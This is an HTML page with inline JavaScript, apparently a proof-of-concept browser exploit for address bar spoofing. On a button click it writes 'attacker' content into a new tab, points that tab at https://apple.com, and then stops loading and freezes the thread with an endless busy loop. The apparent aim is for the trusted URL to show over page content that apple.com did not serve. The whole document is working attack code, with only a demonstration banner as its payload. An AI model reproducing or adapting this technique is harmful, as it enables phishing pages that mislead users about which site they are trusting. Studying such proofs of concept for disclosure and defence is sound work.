<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1, user-scalable=yes"
    />
    <title>testeraza</title>
  </head>
  <body>
    <button
      id="startBtn"
      style="
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        padding: 15px 30px;
        font-size: 18px;
        background: #007aff;
        color: #fff;
        border: none;
        border-radius: 10px;
        cursor: pointer;
        z-index: 10000;
      "
    >
      CLICK HERE
    </button>

    <script>
      document.getElementById("startBtn").onclick = function () {
        this.remove();
        const newTab = window.open("about:blank", "_blank");
        if (newTab) {
          newTab.document.write(`
        <!DOCTYPE html>
        <html>
        <head><title>attacker</title></head>
        <body style="margin:0;padding:0;background:#fff;display:flex;align-items:center;justify-content:center;min-height:100vh;text-align:center;font-family:system-ui">
          <div>
            <h1 style="font-size:96px;font-weight:bold;color:red;margin:0 0 30px 0">ADDRESS BAR SPOOFING</h1>
          </div>
        </body>
        </html>
      `);
          newTab.document.close();

          setTimeout(() => {
            newTab.location.href = "https://apple.com";
          }, 1);

          function freezeChunk(ms) {
            const end = performance.now() + ms;
            while (performance.now() < end) {}
          }

          function loopFreeze() {
            freezeChunk(120000);
            setTimeout(loopFreeze, 100);
          }

          setTimeout(() => {
            try {
              window.stop();
            } catch (e) {}

            loopFreeze();
          }, 475);
        }
      };
    </script>
  </body>
</html>
